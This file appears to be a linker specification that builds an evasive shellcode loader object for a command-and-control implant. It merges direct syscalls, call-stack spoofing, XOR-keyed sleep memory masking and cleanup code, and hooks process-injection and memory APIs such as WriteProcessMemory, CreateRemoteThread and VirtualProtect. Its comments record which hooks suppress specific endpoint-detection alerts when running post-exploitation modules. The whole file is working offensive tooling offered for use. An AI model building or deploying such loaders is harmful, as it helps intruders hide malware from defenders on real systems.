x64:
    load "bin/pico.x64.o"
        make object +disco
    
    # syscalls
    load "bin/syscalls.x64.o"
        merge

    # merge the hook functions
    load "bin/hooks.x64.o"
        merge

    # merge the call stack spoofing
    load "bin/spoof.x64.o"
        merge

    # merge the asm stub
    load "bin/draugr.x64.bin"
        linkfunc "draugr_stub"

    # merge mask
    load "bin/mask.x64.o"
        merge

    # generate and patch in a random key
    generate $KEY 128
    patch "xorkey" $KEY

    # merge cfg code
    load "bin/cfg.x64.o"
        merge
            
    # merge cleanup
    load "bin/cleanup.x64.o"
        merge

    # export setup_hooks and setup_memory
    exportfunc "setup_hooks"  "__tag_setup_hooks"
    exportfunc "setup_memory" "__tag_setup_memory"

    # These functions are used directly in the PICO code
    # There are also some additional functions called from the `cleanup_memory` function in `cleanup.c`
    attach "KERNEL32$ExitThread"          "_ExitThread"
    attach "KERNEL32$Sleep"               "_Sleep"
    attach "KERNEL32$VirtualProtect"      "_VirtualProtect"

    # hook functions in the DLL
    addhook "WININET$InternetOpenA"       "_InternetOpenA"
    addhook "WININET$InternetConnectA"    "_InternetConnectA"
    addhook "KERNEL32$CloseHandle"        "_CloseHandle"
    # Commented out to decrease the payload size - addhook "KERNEL32$CreateFileMappingA" "_CreateFileMappingA"
    addhook "KERNEL32$CreateProcessA"     "_CreateProcessA"
    addhook "KERNEL32$CreateRemoteThread" "_CreateRemoteThread"
    addhook "KERNEL32$CreateThread"       "_CreateThread"
    addhook "KERNEL32$DuplicateHandle"    "_DuplicateHandle"
    addhook "KERNEL32$ExitThread"         "_ExitThreadWithCleanupMemory"
    addhook "KERNEL32$GetThreadContext"   "_GetThreadContext"
    # Commented out to decrease the payload size - addhook "KERNEL32$MapViewOfFile"      "_MapViewOfFile"
    addhook "KERNEL32$OpenProcess"        "_OpenProcess"
    addhook "KERNEL32$OpenThread"         "_OpenThread"
    addhook "KERNEL32$ReadProcessMemory"  "_ReadProcessMemory"
    addhook "KERNEL32$ResumeThread"       "_ResumeThread"
    addhook "KERNEL32$SetThreadContext"   "_SetThreadContext"
    addhook "KERNEL32$Sleep"              "_SleepWithMaskMemory"
    # Commented out to decrease the payload size - addhook "KERNEL32$UnmapViewOfFile"    "_UnmapViewOfFile"
    addhook "KERNEL32$VirtualFree"        "_VirtualFree"
    addhook "KERNEL32$VirtualProtect"     "_VirtualProtect"
    addhook "KERNEL32$VirtualProtectEx"   "_VirtualProtectEx"
    addhook "KERNEL32$VirtualQuery"       "_VirtualQuery"
    addhook "KERNEL32$WriteProcessMemory" "_WriteProcessMemory"
    addhook "OLE32$CoCreateInstance"      "_CoCreateInstance"

    # addhook "KERNEL32$FreeEnvironmentStringsA" "_FreeEnvironmentStringsA"
    # addhook "KERNEL32$GetEnvironmentStrings"   "_GetEnvironmentStrings"
    # addhook "KERNEL32$lstrlenA"           "_lstrlenA"

    ###########################################################################
    # Following hooks are not camptible with:
    # - `powerpick`
    ###########################################################################
    addhook "KERNEL32$GetProcAddress"     "_GetProcAddress"
    addhook "KERNEL32$LoadLibraryA"       "_LoadLibraryA"

    ###########################################################################
    # Following hooks are not camptible with:
    # - `powerpick`
    # - `inject`
    #
    # If they are not used they create 2 alerts ("Shellcode from Unusual 
    # Microsoft Signed Module" and "Shellcode Behavior from Unusual Memory")
    # when executing:
    # - `env` BOF
    ###########################################################################
    # addhook "KERNEL32$VirtualAlloc"       "_VirtualAlloc"
    # addhook "KERNEL32$VirtualAllocEx"     "_VirtualAllocEx"

    disassemble "pico.txt"

    mergelib "../libtcg.x64.zip"

    export
